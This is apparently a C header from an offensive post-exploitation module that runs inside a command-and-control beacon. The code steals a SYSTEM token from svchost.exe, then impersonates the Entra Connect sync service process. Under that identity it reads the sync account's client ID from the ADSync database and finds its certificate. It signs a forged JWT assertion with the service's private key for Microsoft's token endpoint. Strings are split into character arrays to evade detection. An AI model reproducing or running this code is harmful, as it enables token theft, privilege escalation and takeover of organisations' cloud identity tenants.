    if (!API(ADVAPI32, OpenProcessToken)((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open process token: %d\n", API(KERNEL32, GetLastError)());
        return FALSE;
    }

    tp.Privileges[0].Luid.LowPart = 20;
    tp.Privileges[0].Luid.HighPart = 0;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!API(ADVAPI32, AdjustTokenPrivileges)(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enable privilege: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hToken);
        return FALSE;
    }

    if (API(KERNEL32, GetLastError)() == ERROR_NOT_ALL_ASSIGNED) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Required privilege not available. Are you elevated/local admin?\n");
        API(KERNEL32, CloseHandle)(hToken);
        return FALSE;
    }

    API(KERNEL32, CloseHandle)(hToken);
    return TRUE;
}

// Full two-stage impersonation chain: enum processes → steal SYSTEM token → steal ADSync token
static HANDLE impersonate_adsync() {
    HANDLE hSnapshot = NULL;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;
    HANDLE hAdsyncProcess = NULL;
    HANDLE hAdsyncToken = NULL;
    HANDLE hAdsyncDupToken = NULL;
    PROCESSENTRY32W pe = { 0 };
    DWORD adsyncPid = 0;
    BOOL gotSystem = FALSE;

    WCHAR wMii[] = { 'm','i','i','s','e','r','v','e','r','.','e','x','e',0 };
    WCHAR wSvc[] = { 's','v','c','h','o','s','t','.','e','x','e',0 };

    hSnapshot = API(KERNEL32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Process snapshot failed: %d\n", API(KERNEL32, GetLastError)());
        return NULL;
    }

    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (!API(KERNEL32, Process32FirstW)(hSnapshot, &pe)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Process enumeration failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hSnapshot);
        return NULL;
    }

    do {
        if (adsyncPid == 0 && API(MSVCRT, _wcsicmp)(pe.szExeFile, wMii) == 0) {
            adsyncPid = pe.th32ProcessID;
        }

        if (!gotSystem && API(MSVCRT, _wcsicmp)(pe.szExeFile, wSvc) == 0) {
            hProcess = API(KERNEL32, OpenProcess)(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProcess) continue;

            if (!API(ADVAPI32, OpenProcessToken)(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
                API(KERNEL32, CloseHandle)(hProcess);
                hProcess = NULL;
                continue;
            }

            BYTE tokenUserBuf[64];
            DWORD retLen = 0;
            if (API(ADVAPI32, GetTokenInformation)(hToken, TokenUser, tokenUserBuf, sizeof(tokenUserBuf), &retLen)) {
                TOKEN_USER* pTokenUser = (TOKEN_USER*)tokenUserBuf;
                SID* pSid = (SID*)pTokenUser->User.Sid;
                if (pSid->SubAuthorityCount == 1 && pSid->SubAuthority[0] == 18) {
                    gotSystem = TRUE;
                    API(KERNEL32, CloseHandle)(hProcess);
                    hProcess = NULL;
                }
            }

            if (!gotSystem) {
                API(KERNEL32, CloseHandle)(hToken);
                hToken = NULL;
                API(KERNEL32, CloseHandle)(hProcess);
                hProcess = NULL;
            }
        }
    } while (API(KERNEL32, Process32NextW)(hSnapshot, &pe));

    API(KERNEL32, CloseHandle)(hSnapshot);

    if (adsyncPid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Target service process not found. Is the service running?\n");
        if (hToken) API(KERNEL32, CloseHandle)(hToken);
        return NULL;
    }
    VerbosePrintf(CALLBACK_OUTPUT, "[*] Found target process (PID: %d)\n", adsyncPid);

    if (!gotSystem || !hToken) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not obtain a SYSTEM token from any donor process\n");
        if (hToken) API(KERNEL32, CloseHandle)(hToken);
        return NULL;
    }

    VerbosePrintf(CALLBACK_OUTPUT, "[+] Obtained SYSTEM token\n");

    if (!API(ADVAPI32, DuplicateTokenEx)(hToken, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx (stage 1) failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hToken);
        return NULL;
    }
    API(KERNEL32, CloseHandle)(hToken);
    hToken = NULL;

    if (!API(ADVAPI32, ImpersonateLoggedOnUser)(hDupToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Impersonation (stage 1) failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hDupToken);
        return NULL;
    }

    VerbosePrintf(CALLBACK_OUTPUT, "[+] Impersonating SYSTEM\n");

    hAdsyncProcess = API(KERNEL32, OpenProcess)(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, adsyncPid);
    if (!hAdsyncProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess (stage 2) failed: %d\n", API(KERNEL32, GetLastError)());
        API(ADVAPI32, RevertToSelf)();
        API(KERNEL32, CloseHandle)(hDupToken);
        return NULL;
    }

    if (!API(ADVAPI32, OpenProcessToken)(hAdsyncProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hAdsyncToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken (stage 2) failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hAdsyncProcess);
        API(ADVAPI32, RevertToSelf)();
        API(KERNEL32, CloseHandle)(hDupToken);
        return NULL;
    }

    API(KERNEL32, CloseHandle)(hAdsyncProcess);
    hAdsyncProcess = NULL;

    if (!API(ADVAPI32, DuplicateTokenEx)(hAdsyncToken, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &hAdsyncDupToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx (stage 2) failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hAdsyncToken);
        API(ADVAPI32, RevertToSelf)();
        API(KERNEL32, CloseHandle)(hDupToken);
        return NULL;
    }

    API(KERNEL32, CloseHandle)(hAdsyncToken);
    hAdsyncToken = NULL;

    API(ADVAPI32, RevertToSelf)();
    API(KERNEL32, CloseHandle)(hDupToken);
    hDupToken = NULL;

    if (!API(ADVAPI32, ImpersonateLoggedOnUser)(hAdsyncDupToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Impersonation (stage 2) failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hAdsyncDupToken);
        return NULL;
    }

    VerbosePrintf(CALLBACK_OUTPUT, "[+] Impersonation complete\n");
    return hAdsyncDupToken;
}

// Direct impersonation via known PID — no process enumeration, no SYSTEM token theft.
// Caller must already be SYSTEM or have sufficient access to the target token.
static HANDLE impersonate_pid(DWORD pid) {
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;

    hProcess = API(KERNEL32, OpenProcess)(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess(%d) failed: %d\n", pid, API(KERNEL32, GetLastError)());
        return NULL;
    }

    if (!API(ADVAPI32, OpenProcessToken)(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hProcess);
        return NULL;
    }
    API(KERNEL32, CloseHandle)(hProcess);

    if (!API(ADVAPI32, DuplicateTokenEx)(hToken, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hToken);
        return NULL;
    }
    API(KERNEL32, CloseHandle)(hToken);

    if (!API(ADVAPI32, ImpersonateLoggedOnUser)(hDupToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ImpersonateLoggedOnUser failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hDupToken);
        return NULL;
    }

    VerbosePrintf(CALLBACK_OUTPUT, "[+] Impersonating PID %d\n", pid);
    return hDupToken;
}


// ============================================================================
// SQL query: extract client_id from ADSync database
// Returns heap-allocated client_id string, or NULL.
// ============================================================================
static CONST CHAR* query_clientid_from_db(CONST WCHAR* overrideInstance) {
    BOOL sqlConnected     = FALSE;
    SQLHENV sqlEnvHandle  = NULL;
    SQLHDBC sqlConnHandle = NULL;
    SQLHSTMT sqlStmtHandle = NULL;
    SQLRETURN sqlResult;
    WCHAR sqlDriverList[1024];
    WCHAR* sqlDriverName       = NULL;
    WCHAR* sqlConnectionString = NULL;
    SQLCHAR* adSyncPrivateConfig = NULL;
    CONST CHAR* clientId         = NULL;

    CONST WCHAR* sqlInstanceName = resolve_localdb_instance(overrideInstance);
    if (!sqlInstanceName) {
        BeaconPrintf(CALLBACK_ERROR, "Could not determine LocalDB instance name.\n");
        return NULL;
    }

    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &sqlEnvHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL env handle.\n"); goto qdb_cleanup; }

    sqlResult = API(ODBC32, SQLSetEnvAttr)(sqlEnvHandle, SQL_ATTR_ODBC_VERSION, (SQLPOINTER*)SQL_OV_ODBC3, 0);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to set ODBC version.\n"); goto qdb_cleanup; }

    if (!API(ODBCCP32, SQLGetInstalledDriversW)(sqlDriverList, sizeof(sqlDriverList) / sizeof(WCHAR), NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to obtain SQL driver list.\n");
        goto qdb_cleanup;
    }

    for (CONST WCHAR* driver = sqlDriverList; *driver; driver += API(MSVCRT, wcslen)(driver) + 1) {
        if (API(MSVCRT, wcsstr)(driver, L"ODBC Driver ") && API(MSVCRT, wcsstr)(driver, L"for SQL Server")) {
            sqlDriverName = driver;
            break;
        }
    }

    if (!sqlDriverName) { BeaconPrintf(CALLBACK_ERROR, "No suitable ODBC SQL Server driver found.\n"); goto qdb_cleanup; }

    WCHAR wConnFmt[] = { 'D','r','i','v','e','r','=','{','%','l','s','}'
        ,';','S','e','r','v','e','r','=','(','L','o','c','a','l','D','B',')'
        ,'\\','.','\\','%','l','s'
        ,';','D','a','t','a','b','a','s','e','=','A','D','S','y','n','c'
        ,';','T','r','u','s','t','e','d','_','C','o','n','n','e','c','t','i','o','n','=','y','e','s',0 };
    SIZE_T connFmtLen = API(MSVCRT, wcslen)(wConnFmt);
    SIZE_T connStrMaxChars = API(MSVCRT, wcslen)(sqlDriverName) + API(MSVCRT, wcslen)(sqlInstanceName) + connFmtLen + 1;
    sqlConnectionString = BofHeapAlloc(connStrMaxChars * sizeof(WCHAR));
    if (!sqlConnectionString) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate connection string.\n"); goto qdb_cleanup; }
    API(MSVCRT, _snwprintf)(sqlConnectionString, connStrMaxChars, wConnFmt, sqlDriverName, sqlInstanceName);

    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_DBC, sqlEnvHandle, &sqlConnHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL connection handle.\n"); goto qdb_cleanup; }

    sqlResult = API(ODBC32, SQLSetConnectAttrW)(sqlConnHandle, SQL_LOGIN_TIMEOUT, (SQLPOINTER)CONNECT_TIMEOUT, 0);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to set SQL timeout.\n"); goto qdb_cleanup; }

    sqlResult = API(ODBC32, SQLDriverConnectW)(sqlConnHandle, NULL, sqlConnectionString, SQL_NTS, NULL, 0, NULL, SQL_DRIVER_NOPROMPT);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to connect to database. %ls\n", get_last_sql_error(sqlConnHandle, sqlResult));
        goto qdb_cleanup;
    }
    sqlConnected = TRUE;

    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_STMT, sqlConnHandle, &sqlStmtHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL statement handle.\n"); goto qdb_cleanup; }

    WCHAR wQuery[] = { 'S','E','L','E','C','T',' ','p','r','i','v','a','t','e','_','c','o','n','f','i','g','u','r','a','t','i','o','n','_','x','m','l',' ','F','R','O','M',' ','m','m','s','_','m','a','n','a','g','e','m','e','n','t','_','a','g','e','n','t',';',0 };
    sqlResult = API(ODBC32, SQLExecDirectW)(sqlStmtHandle, wQuery, SQL_NTS);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to execute private config query.\n"); goto qdb_cleanup; }

    adSyncPrivateConfig = BofHeapAlloc(CONFIG_SIZE * sizeof(SQLCHAR));
    if (!adSyncPrivateConfig) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate private config buffer.\n"); goto qdb_cleanup; }

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 1, SQL_C_CHAR, adSyncPrivateConfig, CONFIG_SIZE * sizeof(SQLCHAR), NULL);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to bind private config column.\n"); goto qdb_cleanup; }

    sqlResult = API(ODBC32, SQLFetch)(sqlStmtHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to fetch private config.\n"); goto qdb_cleanup; }

    clientId = find_clientid(adSyncPrivateConfig);

    if (!clientId) {
        CONST CHAR* username = find_username(adSyncPrivateConfig);
        if (username && username[0] == '{') {
            clientId = username;
        } else {
            if (username) BofHeapFree(username);
        }
    }

qdb_cleanup:
    if (adSyncPrivateConfig) BofHeapFree(adSyncPrivateConfig);
    if (sqlStmtHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_STMT, sqlStmtHandle);
    if (sqlConnected) API(ODBC32, SQLDisconnect)(sqlConnHandle);
    if (sqlConnHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_DBC, sqlConnHandle);
    if (sqlEnvHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_ENV, sqlEnvHandle);
    if (sqlConnectionString) BofHeapFree(sqlConnectionString);
    return clientId;
}


// ============================================================================
// Cert thumbprint discovery: enumerate cert dir, return first thumbprint found
// Returns heap-allocated 40-char hex string, or NULL.
// ============================================================================
static CHAR* discover_thumbprint() {
    WCHAR wCertDirSearch[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','e','r','v','i','c','e','P','r','o','f','i','l','e','s','\\','A','D','S','y','n','c','\\','A','p','p','D','a','t','a','\\','R','o','a','m','i','n','g','\\','M','i','c','r','o','s','o','f','t','\\','S','y','s','t','e','m','C','e','r','t','i','f','i','c','a','t','e','s','\\','M','y','\\','C','e','r','t','i','f','i','c','a','t','e','s','\\','*',0 };

    WIN32_FIND_DATAW findData = { 0 };
    HANDLE hFind = API(KERNEL32, FindFirstFileW)(wCertDirSearch, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Certificate directory inaccessible: %d\n", API(KERNEL32, GetLastError)());
        return NULL;
    }

    CHAR* thumbprint = NULL;
    INT certCount = 0;

    do {
        if (findData.cFileName[0] == L'.') continue;
        certCount++;

        if (!thumbprint) {
            INT wlen = API(MSVCRT, wcslen)(findData.cFileName);
            if (wlen == 40) {
                thumbprint = BofHeapAlloc(41);
                if (thumbprint) {
                    for (INT i = 0; i < 40; i++) {
                        thumbprint[i] = (CHAR)findData.cFileName[i];
                    }
                    thumbprint[40] = '\0';
                }
            }
        }
    } while (API(KERNEL32, FindNextFileW)(hFind, &findData));

    API(KERNEL32, FindClose)(hFind);

    if (certCount == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No certificates found in target store.\n");
        return NULL;
    }

    if (certCount > 1) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] WARNING: Found %d certificates - using first one.\n", certCount);
    }

    if (thumbprint) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Discovered thumbprint: %s\n", thumbprint);
    }

    return thumbprint;
}


// ============================================================================
// JWT signing: open cert store, acquire key, build and sign JWT assertion
// Requires impersonation of the ADSync service account to be active.
// Returns 0 on success.
// ============================================================================
static INT sign_jwt_assertion(CONST CHAR* thumbprint, CONST CHAR* client_id, CONST CHAR* tenant_id) {
    BCRYPT_ALG_HANDLE hShaAlg = NULL;
    HCERTSTORE hCertStore = NULL;
    PCCERT_CONTEXT pCertCtx = NULL;
    ULONG_PTR hNcryptKey = 0;
    BOOL fCallerFreeKey = FALSE;
    NTSTATUS status = 0;
    LONG ncStatus = 0;
    CHAR* b64Header = NULL;
    CHAR* b64Claims = NULL;
    CHAR* b64Sig = NULL;
    CHAR* guidStr = NULL;
    CHAR* x5tStr = NULL;
    INT result = -1;

    BYTE thumbBytes[20];
    INT thumbLen = hex_to_bytes(thumbprint, thumbBytes, 20);
    if (thumbLen != 20) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid thumbprint (expected 40 hex chars / 20 bytes, got %d bytes)\n", thumbLen);
        return -1;
    }

    hCertStore = API(CRYPT32, CertOpenStore)(
        CERT_STORE_PROV_SYSTEM_W,
        0, 0,
        CERT_SYSTEM_STORE_CURRENT_USER | CERT_STORE_OPEN_EXISTING_FLAG,
        L"MY");
    if (!hCertStore) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CertOpenStore(MY) failed: %d\n", API(KERNEL32, GetLastError)());
        goto sign_cleanup;
    }
    VerbosePrintf(CALLBACK_OUTPUT, "[+] Opened certificate store\n");

    CRYPT_HASH_BLOB hashBlob;
    hashBlob.cbData = 20;
    hashBlob.pbData = thumbBytes;

    pCertCtx = API(CRYPT32, CertFindCertificateInStore)(
        hCertStore,
        (DWORD)(0x00000001 | 0x00010000),
        0,
        CERT_FIND_HASH,
        &hashBlob,
        NULL);
    if (!pCertCtx) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Certificate with thumbprint %s not found in store (error %d)\n",
            thumbprint, API(KERNEL32, GetLastError)());
        goto sign_cleanup;
    }
    VerbosePrintf(CALLBACK_OUTPUT, "[+] Found certificate\n");

    DWORD dwKeySpec = 0;
    if (!API(CRYPT32, CryptAcquireCertificatePrivateKey)(
            pCertCtx,
            CRYPT_ACQUIRE_ONLY_NCRYPT_KEY_FLAG | CRYPT_ACQUIRE_SILENT_FLAG,
            NULL,
            &hNcryptKey,
            &dwKeySpec,
            &fCallerFreeKey)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CryptAcquireCertificatePrivateKey failed: %d\n", API(KERNEL32, GetLastError)());
        goto sign_cleanup;
    }
    VerbosePrintf(CALLBACK_OUTPUT, "[+] Acquired private key handle\n");

#ifdef VERBOSE
    {
        WCHAR propBuf[520];
        DWORD propSize = 0;

        if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Name", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Key Name: %ls\n", propBuf);
        }
        if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Unique Name", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Unique Name: %ls\n", propBuf);
        }
        if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Algorithm Group", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Algorithm: %ls\n", propBuf);
        }
        if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Provider Handle", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
            ULONG_PTR hProv = *(ULONG_PTR*)propBuf;
            WCHAR provName[260];
            DWORD provNameSize = 0;
            if (API(NCRYPT, NCryptGetProperty)(hProv, L"Name", (PBYTE)provName, sizeof(provName), &provNameSize, 0) == 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Provider: %ls\n", provName);
            }
        }
    }
#endif

    x5tStr = base64url_encode(thumbBytes, 20);
    if (!x5tStr) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to base64url encode thumbprint\n");
        goto sign_cleanup;
    }

    CHAR jwtHeader[JWT_MAX_HEADER];
    API(MSVCRT, _snprintf)(jwtHeader, JWT_MAX_HEADER,
        "{\"typ\":\"JWT\",\"alg\":\"RS256\",\"x5t\":\"%s\"}", x5tStr);

    LONGLONG now = get_unix_time();
    LONGLONG exp = now + 300;
    guidStr = generate_guid_string();
    if (!guidStr) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to generate GUID for jti\n");
        goto sign_cleanup;
    }

    CHAR jwtAud[512];
    CHAR aFmt[] = { 'h','t','t','p','s',':','/','/','l','o','g','i','n','.','m','i','c','r','o','s','o','f','t','o','n','l','i','n','e','.','c','o','m','/','%','s','/','o','a','u','t','h','2','/','v','2','.','0','/','t','o','k','e','n',0 };
    API(MSVCRT, _snprintf)(jwtAud, 512, aFmt, tenant_id);

    CHAR jwtClaims[JWT_MAX_CLAIMS];
    API(MSVCRT, _snprintf)(jwtClaims, JWT_MAX_CLAIMS,
        "{\"iss\":\"%s\",\"aud\":\"%s\",\"iat\":%lld,\"nbf\":%lld,\"exp\":%lld,\"jti\":\"%s\",\"sub\":\"%s\"}",
        client_id, jwtAud, now, now, exp, guidStr, client_id);

    b64Header = base64url_encode((CONST BYTE*)jwtHeader, API(MSVCRT, strlen)(jwtHeader));
    b64Claims = base64url_encode((CONST BYTE*)jwtClaims, API(MSVCRT, strlen)(jwtClaims));
    if (!b64Header || !b64Claims) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to base64url encode JWT components\n");
        goto sign_cleanup;
    }

    CHAR sigInput[JWT_MAX_ASSERTION];
    API(MSVCRT, _snprintf)(sigInput, JWT_MAX_ASSERTION, "%s.%s", b64Header, b64Claims);
    INT sigInputLen = API(MSVCRT, strlen)(sigInput);

    BYTE sha256Hash[32];
    status = API(BCRYPT, BCryptOpenAlgorithmProvider)(&hShaAlg, L"SHA256", NULL, 0);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BCryptOpenAlgorithmProvider(SHA256) failed: 0x%08x\n", status);
        goto sign_cleanup;
    }
    status = API(BCRYPT, BCryptHash)(hShaAlg, NULL, 0,
        (PUCHAR)sigInput, sigInputLen, sha256Hash, 32);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BCryptHash(SHA256) failed: 0x%08x\n", status);
        goto sign_cleanup;
    }

    MY_BCRYPT_PKCS1_PADDING_INFO padInfo;
    padInfo.pszAlgId = L"SHA256";

    DWORD sigLen = 0;
    ncStatus = API(NCRYPT, NCryptSignHash)(hNcryptKey, &padInfo, sha256Hash, 32,
        NULL, 0, &sigLen, BCRYPT_PAD_PKCS1);
    if (ncStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NCryptSignHash (size query) failed: 0x%08x\n", ncStatus);
        goto sign_cleanup;
    }

    BYTE* sigBuf = BofHeapAlloc(sigLen);
    if (!sigBuf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate signature buffer\n");
        goto sign_cleanup;
    }

    ncStatus = API(NCRYPT, NCryptSignHash)(hNcryptKey, &padInfo, sha256Hash, 32,
        sigBuf, sigLen, &sigLen, BCRYPT_PAD_PKCS1);
    if (ncStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NCryptSignHash failed: 0x%08x\n", ncStatus);
        BofHeapFree(sigBuf);
        goto sign_cleanup;
    }

    b64Sig = base64url_encode(sigBuf, sigLen);
    BofHeapFree(sigBuf);
    if (!b64Sig) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to base64url encode signature\n");
        goto sign_cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[+] Authentication assertion for roadtx:\n%s.%s.%s\n",
        b64Header, b64Claims, b64Sig);

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[+] Parameters for token request:\n"
        "    Thumbprint: %s\n"
        "    Client ID:  %s\n"
        "    Tenant ID:  %s\n",
        thumbprint, client_id, tenant_id);

    result = 0;

sign_cleanup:
    if (b64Sig) BofHeapFree(b64Sig);
    if (b64Claims) BofHeapFree(b64Claims);
    if (b64Header) BofHeapFree(b64Header);
    if (guidStr) BofHeapFree(guidStr);
    if (x5tStr) BofHeapFree(x5tStr);
    if (hShaAlg) API(BCRYPT, BCryptCloseAlgorithmProvider)(hShaAlg, 0);
    if (hNcryptKey && fCallerFreeKey) API(NCRYPT, NCryptFreeObject)(hNcryptKey);
    if (pCertCtx) API(CRYPT32, CertFreeCertificateContext)(pCertCtx);
    if (hCertStore) API(CRYPT32, CertCloseStore)(hCertStore, 0);
    return result;
}


#endif // ENTRASYNCDUMP_COMMON_H
